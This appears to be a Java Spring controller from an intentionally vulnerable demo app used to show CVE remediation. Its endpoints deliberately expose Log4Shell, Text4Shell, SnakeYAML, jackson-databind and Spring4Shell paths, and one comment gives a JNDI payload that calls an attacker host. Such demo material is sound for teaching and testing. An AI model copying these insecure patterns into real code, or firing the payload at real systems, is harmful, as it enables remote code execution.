package com.broadcom.vulndemo.web;

import com.broadcom.vulndemo.model.Vulnerability;
import com.broadcom.vulndemo.service.VulnerabilityRegistry;
import org.apache.commons.text.StringSubstitutor;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.springframework.web.bind.annotation.*;
import org.yaml.snakeyaml.Yaml;

import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;

/**
 * Intentionally-vulnerable demo endpoints. Each one exercises a real, unpatched
 * code path in a pinned dependency so the Tanzu remediation demo can show a live
 * exploit before-and-after patching.
 *
 * WARNING: every handler here is deliberately insecure. Do not copy into real code.
 */
@RestController
@RequestMapping("/api")
public class DemoController {

    // Deliberately using the vulnerable log4j2 logger (CVE-2021-44228).
    private static final Logger log = LogManager.getLogger(DemoController.class);

    private final VulnerabilityRegistry registry;

    public DemoController(VulnerabilityRegistry registry) {
        this.registry = registry;
    }

    /** Machine-readable CVE feed backing the dashboard. */
    @GetMapping("/cves")
    public List<Vulnerability> cves() {
        return registry.getAll();
    }

    /**
     * CVE-2021-44228 (Log4Shell). User input is logged verbatim; a payload such as
     * ${jndi:ldap://attacker/x} is interpolated by the vulnerable log4j-core 2.14.1.
     */
    @GetMapping("/log")
    public Map<String, String> logIt(@RequestParam(defaultValue = "hello") String message) {
        log.info("User supplied message: {}", message);
        return Map.of("logged", message,
                "note", "Input was passed straight to log4j-core 2.14.1 (CVE-2021-44228).");
    }

    /**
     * CVE-2022-42889 (Text4Shell). Untrusted input is interpolated by
     * StringSubstitutor, which resolves ${script:...}, ${dns:...} and ${url:...}.
     */
    @GetMapping("/lookup")
    public Map<String, String> lookup(@RequestParam(defaultValue = "${sys:user.name}") String expr) {
        // createInterpolator() enables the dangerous script/dns/url lookups — this
        // is exactly the CVE-2022-42889 code path.
        StringSubstitutor interpolator = StringSubstitutor.createInterpolator();
        Map<String, String> out = new LinkedHashMap<>();
        out.put("input", expr);
        try {
            out.put("interpolated", interpolator.replace(expr));
            out.put("note", "commons-text 1.9 resolved the lookup (CVE-2022-42889).");
        } catch (Exception e) {
            // e.g. ${script:...} needs a JSR-223 engine, absent on JDK 15+.
            out.put("interpolated", "");
            out.put("error", e.getClass().getSimpleName() + ": " + e.getMessage());
            out.put("note", "Interpolation was attempted by commons-text 1.9 (CVE-2022-42889); "
                    + "this lookup type is unavailable on JDK 17, but ${sys}/${env}/${url} resolve.");
        }
        return out;
    }

    /**
     * CVE-2022-1471 (SnakeYAML). Untrusted YAML is parsed with the default
     * Constructor, allowing instantiation of arbitrary types.
     */
    @PostMapping(value = "/yaml", consumes = "text/plain")
    public Object parseYaml(@RequestBody String yaml) {
        Yaml parser = new Yaml(); // unsafe default constructor
        Object loaded = parser.load(yaml);
        return Map.of("parsedType", loaded == null ? "null" : loaded.getClass().getName(),
                "note", "snakeyaml 1.29 default Constructor (CVE-2022-1471).");
    }

    /**
     * CVE-2020-36518 (jackson-databind). Deeply nested JSON deserialization can
     * exhaust the stack. This endpoint echoes back the parsed structure.
     */
    @PostMapping(value = "/json", consumes = "application/json")
    public Map<String, Object> parseJson(@RequestBody Map<String, Object> body) {
        return Map.of("keys", body.keySet(),
                "note", "jackson-databind 2.13.1 nested-object DoS (CVE-2020-36518).");
    }

    /**
     * Spring4Shell (CVE-2022-22965) surface: a POJO bound directly from request
     * parameters via Spring MVC data binding on JDK 9+.
     */
    @PostMapping("/greeting")
    public Map<String, String> greeting(Greeting greeting) {
        return Map.of("greeting", "Hello, " + greeting.getName() + "!",
                "note", "POJO bound via Spring MVC data binding (CVE-2022-22965).");
    }

    /** Simple command bean bound from request parameters (Spring4Shell surface). */
    public static class Greeting {
        private String name = "world";
        public String getName() { return name; }
        public void setName(String name) { this.name = name; }
    }
}
